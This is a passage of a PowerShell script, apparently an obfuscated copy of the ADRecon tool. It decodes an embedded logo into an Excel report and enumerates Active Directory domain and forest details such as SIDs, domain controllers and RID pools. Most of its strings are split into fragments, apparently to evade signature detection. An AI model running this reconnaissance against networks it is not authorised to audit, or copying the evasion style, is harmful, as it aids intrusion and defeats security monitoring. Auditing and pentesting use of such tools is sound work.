w25XnRQNXB/Z7R/I'+'tf9kO5T6'+'lqV70NT6M7VyuqPpz7XI/lMq984lpnVcCQDya/7Id1p5/1NfUfaL9ou3r+24MdOl+0fxcdddGv+yHcn0P9TEKYeXgrj6uPXyLX/ZHe'+'5J4ZMg2+oOvQ0xW0OMnkcXF/kuD+x2j3W4'+'pyKeXFqnhriR5u6+f9'+'TnVeSyKQdA5N0GPIkNRrr2uvn/U1/wAYk9o+b/xmT8XlIoqPqXdf7fk1/wBo9rf+27'+'f+z2j+Ra/7Id18/wC'+'pr/tFx/Itf9kdo+d+7y6mI9nlAjWOujJPmxLC'+'rFY82i73CVPvYPEtKriaNRTw1ftx/i5LOKWtqD0D4drhE8y'+'UFXCrWR+00Wd/L/F'+'KcC1Cy'+'oYaaUZRDJi'+'hR6mFLX'+'HkRrq/bj/FqFlQw0FKMohkxQo9TCl'+'rjyI1'+'1ftx/i89uUME6pIalbzKkrSaIq/bj'+'/FmfbJ'+'EC5HCj50ysl+ruETypQVcKtZHq0STLCE04lqk'+'hWFooNR'+'/v+//xAAzEAEAAwACAgI'+'CAgMBAQAAAgsBEQAhMUFRYXGBkaGxwfDREOHxIDBAUGBwgJCgsMDQ4P'+'/aAAgBAQABPyH/AP'+'XoQHLfFhkC'+'0kH51UGYQeaOGZHJ/wAQTSvdf8TyMYzwVkAjDRDKZfoqYxJf/wBDP0v8390/hf8AP+7+mv'+'7f+f8An4VPrihzizyv7Nf5TzeBygj8rzNkKfNBoEFJFi5IKcT+aDEIAJ/F9SyEUGgQUkWLkgpxP'+'5v+L/dUHiER0/Vjg'+'uHOfd/xf7q'+'DEIAJ/F9SaEVf1wO+X2Dt/fd9X2B'+'oc4s/9D4HIJnurZYZPTKL52bJlJYoh7'+'v7f+f/AMHufCD+rA'+'xmaP6lIXmKqus1UhsJfikYEjw004pmkDMoycN'+'P2'+'EPd/wDoXyDHO35E8Z3/AMEkjRPmgISKSSTrTLm8yppKfM//AIOPgBJ/F4dw9tlxp0b+9/a/tv5/58ljTr1c2lCENUOdUKYEHmNb9Hg4+v8AiRzqhxCj9n/g/'+'dayb+zX+U8/8/SX9r/'+'P/wCE3Sf5Tz/+C3CCwfJ4qyYPPLX50pb0xhXcHk8cUy6Qun/EL4Dj/wAKobHbKCiRSfmkbjB4qoMBQeFqHm7wA93/ABCg0APC1Dzd4Ae7'+'/iMIEaEN'+'6lrDn/EJbEGpyv5QQ0qls9soOJFp+aJwqa'+'M+BH/6+'+'P/aA'+'AwDAQACEQMRAAAQ7zzzzzzz/wD/APP/AD/wKn'+'maoBooIKgvfeTw8W/lljjYE0YOWwgCijjT9T9yxgAg/wD/AP8A/wD/AP8A/wD/AP8A/wD'+'/AP8A/8QAMxEBAQEAAwABAgUFAQEAAQEJAQARITEQQVFhIHHwkYGhsdHB4'+'fEwQFBgcICQoLDA0OD/2gAIAQMRAT8Qsss/+gc3K+g2YqNujmNntBcY4JE21uQkNwSJtkl0UopDkyNYE+seL'+'EtlyjlvqQLuXISv'+'rdiTi4OcZYrBhDkYMyzYGS'+'PSZbPLTi/KSt04vylo64+khMj01aW7f/wP/9oACAECEQE'+'/EP8A7rwzk+pkCXCwYdPmR35LwpbQU'+'I5'+'KBt8GP7WoSHObUOp'+'2Mh8yLHUIy2z8kAhghPyjinHx976E4yP2mI2Bl8r6QDitJfl'+'IwPi/oItnX0sI'+'jA4It+rv5w7GHJgfOlfDgfOlfDiA3k+bB5'+'TfGUf5OwB8f/gf/9oACAEBAAE/EP8A9P6u'+'HOf3U76uX7rzzUI/5neXPN54/wCH/wChCDKAHlqdxZ8nuR6rm8UORxF9Qjm'+'PVVURhgv/ANb/AKs7xoQo4je71TziphgrUPGBeRPqi9c'+'vQc40E7gNJ4rf'+'uw+P+/i56/5H/IfH/Iv+b/8Ag/'+'fxf8X4f8Mf4rz/AMDw8HXTEcFloORd/T7pZHf'+'aZ'+'mifl/'+'yvg/'+'8A2'+'XlD2XXGsrKPCQMa0rQehwF2fFaq'+'0RSGn2pbjhg8sJfFVg5KxHjGtB6HAX'+'ZjitVaIpDT7f8AHNE'+'ibhMhqaRA7wmO'+'QRP/ABwNxwweWEviqi81iPGN'+'ihoD'+'yNN3jEgxETAeqIQ5R0x6mlAV8ss'+'z/wAPa0gc'+'VkonCuMUypAY/FHmQQOT192AsGoHUfx/w7q8Dr/RcwB8fzUGQdb7sQxlJsSzHFm/OECZlizBl'+'7rrKRCYXNJaEnALJVOBE9euaWI'+'J'+'4PO9VeYEik9qQAcjflf/AKupa5p//SyEks4/4Lp/Yq3RKOZ4oMQ6/ujH'+'kYeQVRnWAiEnVNX'+'KRJ4vgB'+'6/n/hEfxRFkg85NSPik'+'LWeSGF'+'48lkBc8GHOx7v+xV/Jf8Ag'+'Ez/AB58uqnveZDnKiJFEfDKtIjTK5o+GzFt'+'wBcE8ji81AkZB9ySk2hBPIWfi/8A0P8AusW0BlGPd/f/AMqPT7uNWPd/x/u/'+'7Xld82P+B1e8d380Cvt/K/4byv8AgPV/xfuwe6J4A1B50Vbxh'+'wHPqtRLE8rzYCoSCYHmsyslwhDgfdXi1yILMcX/AOt/1RwRw5Di9XZ0Xbx5ZPxQ7mpQN4IjjiiVjpSTs/1XCJo'+'phMP6sBvmXzJXjzf/AK3/AFRKxk5J2f6rhE0UwmH9WA3zL5krx5v/ANb/AKsblVUay79Ua2pCiMvHu/8A1v8Aqr0wehckJV1n'+'QIw4uzs63js1Q4djQ/j1YTeP6sSkz/VVFL/fN/vn/vcwXuYokcFH/oxZs13/ALNd/wCrN'+'n0ZxSPBZ2Xfn/8AAv1Zs+j/APT/AP/Z')

        $bytes = [System.Convert]::FromBase64String($base64adrecon)
        Remove-Variable base64adrecon

        $CompanyLogo = -join($ReportPath,'\',('ADRec'+'on_Lo'+'g'+'o'+'.jpg'))
		$p = New-Object IO.MemoryStream($bytes, 0, $bytes.length)
		$p.Write($bytes, 0, $bytes.length)
        Add-Type -AssemblyName System.Drawing
		$picture = [System.Drawing.Image]::FromStream($p, $true)
		$picture.Save($CompanyLogo)

        Remove-Variable bytes
        Remove-Variable p
        Remove-Variable picture

        $LinkToFile = $false
        $SaveWithDocument = $true
        $Left = 0
        $Top = 0
        $Width = 150
        $Height = 50

        # Add image to the Sheet
        $worksheet.Shapes.AddPicture($CompanyLogo, $LinkToFile, $SaveWithDocument, $Left, $Top, $Width, $Height) | Out-Null

        Remove-Variable LinkToFile
        Remove-Variable SaveWithDocument
        Remove-Variable Left
        Remove-Variable Top
        Remove-Variable Width
        Remove-Variable Height

        If (Test-Path -Path $CompanyLogo)
        {
            Remove-Item $CompanyLogo
        }
        Remove-Variable CompanyLogo

        $row = 5
        $column = 1
        $worksheet.Cells.Item($row,$column)= ('Ta'+'ble '+'of '+'Conte'+'nts')
        $worksheet.Cells.Item($row,$column).Style = ('H'+'ead'+'ing 2')
        $row++

        For($i=2; $i -le $workbook.Worksheets.Count; $i++)
        {
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item($row,$column) , "" , "'$($workbook.Worksheets.Item($i).Name)'!A1", "", $workbook.Worksheets.Item($i).Name) | Out-Null
            $row++
        }

        $row++
		$workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item($row,1) , ('https://githu'+'b'+'.c'+'om/adrec'+'on/ADRe'+'co'+'n'), "" , "", ('g'+'it'+'h'+'ub.co'+'m/adr'+'econ'+'/ADReco'+'n')) | Out-Null

        $worksheet.UsedRange.EntireColumn.AutoFit() | Out-Null

        $excel.Windows.Item(1).Displaygridlines = $false
        $excel.ScreenUpdating = $true
        $ADStatFileName = -join($ExcelPath,'\',$DomainName,('ADRecon-'+'Re'+'por'+'t.'+'x'+'ls'+'x'))
        Try
        {
            # Disable prompt if file exists
            $excel.DisplayAlerts = $False
            $workbook.SaveAs($ADStatFileName)
            Write-Output ('['+'+] '+'Excels'+'heet'+' '+'Save'+'d'+' '+'t'+'o: '+"$ADStatFileName")
        }
        Catch
        {
            Write-Error "[EXCEPTION] $($_.Exception.Message) "
        }
        $excel.Quit()
        Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet -Final $true
        Remove-Variable worksheet
        Get-ADRExcelComObjRelease -ComObjtoRelease $workbook -Final $true
        Remove-Variable -Name workbook -Scope Global
        Get-ADRExcelComObjRelease -ComObjtoRelease $excel -Final $true
        Remove-Variable -Name excel -Scope Global
    }
}

Function Get-ADRDomain
{
<#
.SYNOPSIS
    Returns information of the current (or specified) domain.

.DESCRIPTION
    Returns information of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ('ADW'+'S'))
    {
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ('[Get-ADRD'+'omain'+'] Er'+'ro'+'r '+'g'+'ett'+'in'+'g '+'D'+'omain Cont'+'ext')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        If ($ADDomain)
        {
            $DomainObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            $FLAD = @{
	            0 = ('W'+'indows200'+'0');
	            1 = ('Wind'+'ows2003'+'/In'+'terim');
	            2 = ('Windo'+'w'+'s2003');
	            3 = ('Wind'+'ows20'+'0'+'8');
	            4 = ('Window'+'s2'+'0'+'08R2');
	            5 = ('Windo'+'w'+'s2012');
	            6 = ('Wind'+'ow'+'s2012R2');
	            7 = ('Win'+'dows'+'2016')
            }
            $DomainMode = $FLAD[[convert]::ToInt32($ADDomain.DomainMode)] + ('Dom'+'ain')
            Remove-Variable FLAD
            If (-Not $DomainMode)
            {
                $DomainMode = $ADDomain.DomainMode
            }

            $ObjValues = @(('N'+'ame'), $ADDomain.DNSRoot, ('Ne'+'tBIOS'), $ADDomain.NetBIOSName, ('Fun'+'ct'+'ional L'+'evel'), $DomainMode, ('Do'+'mainSID'), $ADDomain.DomainSID.Value)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Categ'+'or'+'y') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name ('Val'+'ue') -Value $ObjValues[$i+1]
                $i++
                $DomainObj += $Obj
            }
            Remove-Variable DomainMode

            For($i=0; $i -lt $ADDomain.ReplicaDirectoryServers.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Cat'+'egory') -Value ('Domain C'+'o'+'n'+'tro'+'ller')
                $Obj | Add-Member -MemberType NoteProperty -Name ('Va'+'lue') -Value $ADDomain.ReplicaDirectoryServers[$i]
                $DomainObj += $Obj
            }
            For($i=0; $i -lt $ADDomain.ReadOnlyReplicaDirectoryServers.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Cat'+'e'+'gory') -Value ('Read Only'+' D'+'oma'+'in Con'+'trol'+'ler')
                $Obj | Add-Member -MemberType NoteProperty -Name ('V'+'alue') -Value $ADDomain.ReadOnlyReplicaDirectoryServers[$i]
                $DomainObj += $Obj
            }

            Try
            {
                $ADForest = Get-ADForest $ADDomain.Forest
            }
            Catch
            {
                Write-Verbose ('[G'+'et'+'-'+'A'+'DRDomain] Erro'+'r gett'+'ing For'+'e'+'st Context')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            If (-Not $ADForest)
            {
                Try
                {
                    $ADForest = Get-ADForest -Server $DomainController
                }
                Catch
                {
                    Write-Warning ('[Get-ADR'+'Doma'+'in]'+' Erro'+'r gett'+'ing For'+'est Con'+'text')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }
            If ($ADForest)
            {
                $DomainCreation = Get-ADObject -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.Name)))" -Properties whenCreated
                If (-Not $DomainCreation)
                {
                    $DomainCreation = Get-ADObject -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.NetBIOSName)))" -Properties whenCreated
                }
                Remove-Variable ADForest
            }
            # Get RIDAvailablePool
            Try
            {
                $RIDManager = Get-ADObject -Identity "CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName) " -Properties rIDAvailablePool
                $RIDproperty = $RIDManager.rIDAvailablePool
                [int32] $totalSIDS = $($RIDproperty) / ([math]::Pow(2,32))
                [int64] $temp64val = $totalSIDS * ([math]::Pow(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName) "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            If ($DomainCreation)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Cat'+'eg'+'ory') -Value ('Crea'+'tio'+'n D'+'ate')
                $Obj | Add-Member -MemberType NoteProperty -Name ('Va'+'lue') -Value $DomainCreation.whenCreated
                $DomainObj += $Obj
                Remove-Variable DomainCreation
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ('Cat'+'ego'+'ry') -Value ('ms'+'-'+'D'+'S-Machi'+'neAccou'+'nt'+'Quot'+'a')
            $Obj | Add-Member -MemberType NoteProperty -Name ('V'+'alue') -Value $((Get-ADObject -Identity ($ADDomain.DistinguishedName) -Properties ms-DS-MachineAccountQuota).'ms-DS-MachineAccountQuota')
            $DomainObj += $Obj

            If ($RIDsIssued)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Cat'+'egor'+'y') -Value ('RID'+'s Is'+'sue'+'d')
                $Obj | Add-Member -MemberType NoteProperty -Name ('Valu'+'e') -Value $RIDsIssued
                $DomainObj += $Obj
                Remove-Variable RIDsIssued
            }
            If ($RIDsRemaining)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Ca'+'t'+'egory') -Value ('R'+'IDs Rem'+'aining')
                $Obj | Add-Member -MemberType NoteProperty -Name ('V'+'alue') -Value $RIDsRemaining
                $DomainObj += $Obj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If ($Method -eq ('LDA'+'P'))
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(('Doma'+'in'),$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning ('[Get-AD'+'RDom'+'ain]'+' Err'+'o'+'r gett'+'ing Dom'+'ain Context')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext
            # Get RIDAvailablePool
            Try
            {
                $SearchPath = ('CN=R'+'ID '+"Manager$,CN=System")
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath.PropertiesToLoad.AddRange((('ri'+'davail'+'able'+'poo'+'l')))
                $objSearcherResult = $objSearcherPath.FindAll()
                $RIDproperty = $objSearcherResult.Properties.ridavailablepool
                [int32] $totalSIDS = $($RIDproperty) / ([math]::Pow(2,32))
                [int64] $temp64val = $totalSIDS * ([math]::Pow(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable SearchPath
                $objSearchPath.Dispose()
                $objSearcherPath.Dispose()
                $objSearcherResult.Dispose()
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName) "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(('Fo'+'rest'),$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            Catch
            {
                Write-Warning ('[Get-'+'A'+'DRDomain]'+' Error ge'+'t'+'ting Fore'+'st C'+'ontext')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            If ($ForestContext)
            {
                Remove-Variable ForestContext
            }
            If ($ADForest)
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
            }
            If ($GlobalCatalog)
            {
                $DN = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($($DN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                    $ADObject.Dispose()
                }
                Catch
                {
                    Write-Warning "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
                }
            }
            Else
            {
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            Try
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
                $DN = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($DN)
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                $ADObject.dispose()
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
            # Get RIDAvailablePool
            Try
            {
                $RIDManager = ([ADSI]"LDAP://CN=RID Manager$,CN=System,$($objDomain.distinguishedName) ")
                $RIDproperty = $ObjDomain.ConvertLargeIntegerToInt64($RIDManager.Properties.rIDAvailablePool.value)
                [int32] $totalSIDS = $($RIDproperty) / ([math]::Pow(2,32))
                [int64] $temp64val = $totalSIDS * ([math]::Pow(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName) "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }

        If ($ADDomain)
        {
            $DomainObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            $FLAD = @{
	            0 = ('Windows'+'2'+'000');
	            1 = ('Wi'+'ndow'+'s2003/Inte'+'rim');
	            2 = ('Wind'+'ows2'+'003');
	            3 = ('Win'+'do'+'ws'+'2008');
	            4 = ('Windo'+'ws2008R'+'2');
	            5 = ('Wi'+'n'+'dow'+'s2012');
	            6 = ('Wind'+'o'+'ws2012R2');
	            7 = ('Wind'+'o'+'ws2'+'016')
            }
            $DomainMode = $FLAD[[convert]::ToInt32($objDomainRootDSE.domainFunctionality,10)] + ('Dom'+'ain')
            Remove-Variable FLAD

            $ObjValues = @(('Nam'+'e'), $ADDomain.Name, ('NetBIO'+'S'), $objDomain.dc.value, ('F'+'unctional L'+'e'+'v'+'el'), $DomainMode, ('Dom'+'ain'+'S'+'ID'), $ADDomainSID.Value)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Cate'+'gor'+'y') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name ('Val'+'ue') -Value $ObjValues[$i+1]
                $i++
                $DomainObj += $Obj
            }
            Remove-Variable DomainMode

            For($i=0; $i -lt $ADDomain.DomainControllers.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Ca'+'t'+'egory') -Value ('Domain '+'C'+'o'+'ntrol'+'ler')
                $Obj | Add-Member -MemberType NoteProperty -Name ('Valu'+'e') -Value $ADDomain.DomainControllers[$i]
                $DomainObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ('Cat'+'e'+'gory') -Value ('Cr'+'eation '+'Da'+'t'+'e')
            $Obj | Add-Member -MemberType NoteProperty -Name ('Va'+'lue') -Value $objDomain.whencreated.value
            $DomainObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ('Cat'+'eg'+'ory') -Value ('ms-DS'+'-Ma'+'chineA'+'ccountQu'+'ota')
            $Obj | Add-Member -MemberType NoteProperty -Name ('Valu'+'e') -Value $objDomain.'ms-DS-MachineAccountQuota'.value
            $DomainObj += $Obj

            If ($RIDsIssued)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Cate'+'gor'+'y') -Value ('R'+'IDs Issu'+'ed')
                $Obj | Add-Member -MemberType NoteProperty -Name ('V'+'alue') -Value $RIDsIssued
                $DomainObj += $Obj
                Remove-Variable RIDsIssued
            }
            If ($RIDsRemaining)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Cat'+'eg'+'ory') -Value ('R'+'I'+'Ds'+' '+'Remaining')
                $Obj | Add-Member -MemberType NoteProperty -Name ('Val'+'ue') -Value $RIDsRemaining
                $DomainObj += $Obj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If ($DomainObj)
    {
        Return $DomainObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRForest
{
<#
.SYNOPSIS
    Returns information of the current (or specified) forest.

.DESCRIPTION
    Returns information of the current (or specified) forest.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ('ADW'+'S'))
    {
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ('[Get-ADR'+'F'+'o'+'re'+'st] '+'Er'+'ror g'+'etting Dom'+'ain'+' '+'Context')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADForest = Get-ADForest $ADDomain.Forest
        }
        Catch
        {
            Write-Verbose ('[Ge'+'t-ADR'+'F'+'o'+'rest]'+' '+'Error '+'ge'+'tting'+' '+'Fo'+'re'+'s'+'t Context')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        Remove-Variable ADDomain

        If (-Not $ADForest)
        {
            Try
            {
                $ADForest = Get-ADForest -Server $DomainController
            }
            Catch
            {
                Write-Warning ('[G'+'et-'+'ADRFores'+'t] Erro'+'r getting'+' Forest C'+'on'+'te'+'xt '+'using Serve'+'r param'+'e'+'ter')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }

        If ($ADForest)
        {
            # Get Tombstone Lifetime
            Try
            {
                $ADForestCNC = (Get-ADRootDSE).configurationNamingContext
                $ADForestDSCP = Get-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,$($ADForestCNC) " -Partition $ADForestCNC -Properties *
                $ADForestTombstoneLifetime = $ADForestDSCP.tombstoneLifetime
                Remove-Variable ADForestCNC
                Remove-Variable ADForestDSCP
            }
            Catch
            {
                Write-Warning ('[G'+'et-ADRFo'+'rest] E'+'rror r'+'etrieving'+' Tombs'+'ton'+'e'+' Lifetime')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            # Check Recycle Bin Feature Status
            If ([convert]::ToInt32($ADForest.ForestMode) -ge 6)
            {
                Try
                {
                    $ADRecycleBin = Get-ADOptionalFeature -Identity ('R'+'ec'+'yc'+'l'+'e '+'Bin Feature')
                }
                Catch
                {
                    Write-Warning ('[Get-'+'A'+'D'+'RFo'+'r'+'es'+'t] Erro'+'r retriev'+'ing Recycle Bin'+' Fe'+'a'+'ture')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }

            # Check Privileged Access Management Feature status
            If ([convert]::ToInt32($ADForest.ForestMode) -ge 7)
            {
                Try
                {
                    $PrivilegedAccessManagement = Get-ADOptionalFeature -Identity ('Privile'+'g'+'e'+'d A'+'cce'+'s'+'s Man'+'agemen'+'t Feat'+'ure')
                }
                Catch
                {
                    Write-Warning ('[Get-AD'+'RFo'+'res'+'t'+'] Err'+'or re'+'trieving'+' Priv'+'ileg'+'ed '+'Accee'+'ss '+'M'+'a'+'n'+'ag'+'e'+'me'+'nt Feat'+'u'+'re')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }

            $ForestObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            $FLAD = @{
                0 = ('Wind'+'o'+'ws2000');
                1 = ('Windows2003'+'/'+'I'+'nter'+'im');
                2 = ('Wi'+'n'+'dows2'+'003');
                3 = ('Wind'+'o'+'ws200'+'8');
                4 = ('Wi'+'ndows2'+'00'+'8R2');
                5 = ('Windo'+'w'+'s2'+'012');
                6 = ('Windows2'+'0'+'12'+'R2');
                7 = ('Win'+'d'+'ows20'+'16')
            }
            $ForestMode = $FLAD[[convert]::ToInt32($ADForest.ForestMode)] + ('F'+'orest')
            Remove-Variable FLAD

            If (-Not $ForestMode)
            {
                $ForestMode = $ADForest.ForestMode
            }

            $ObjValues = @(('Nam'+'e'), $ADForest.Name, ('Fun'+'ct'+'ional L'+'ev'+'el'), $ForestMode, ('Do'+'main Naming Ma'+'ste'+'r'), $ADForest.DomainNamingMaster, ('Schema'+' Ma'+'ster'), $ADForest.SchemaMaster, ('RootDom'+'a'+'in'), $ADForest.RootDomain, ('Do'+'main Cou'+'nt'), $ADForest.Domains.Count, ('Site C'+'oun'+'t'), $ADForest.Sites.Count, ('Globa'+'l '+'Catalog'+' C'+'ou'+'nt'), $ADForest.GlobalCatalogs.Count)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('C'+'ate'+'gory') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name ('Val'+'ue') -Value $ObjValues[$i+1]
                $i++
                $ForestObj += $Obj
            }
            Remove-Variable ForestMode

            For($i=0; $i -lt $ADForest.Domains.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('C'+'atego'+'ry') -Value ('Doma'+'in')
                $Obj | Add-Member -MemberType NoteProperty -Name ('V'+'alue') -Value $ADForest.Domains[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest.Sites.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ('Ca'+'tegory') -Value ('S'+'ite')
                $Obj | Add-Member -MemberType NoteProperty -Name ('Valu'+'e') -Value $ADForest.Sites[$i]
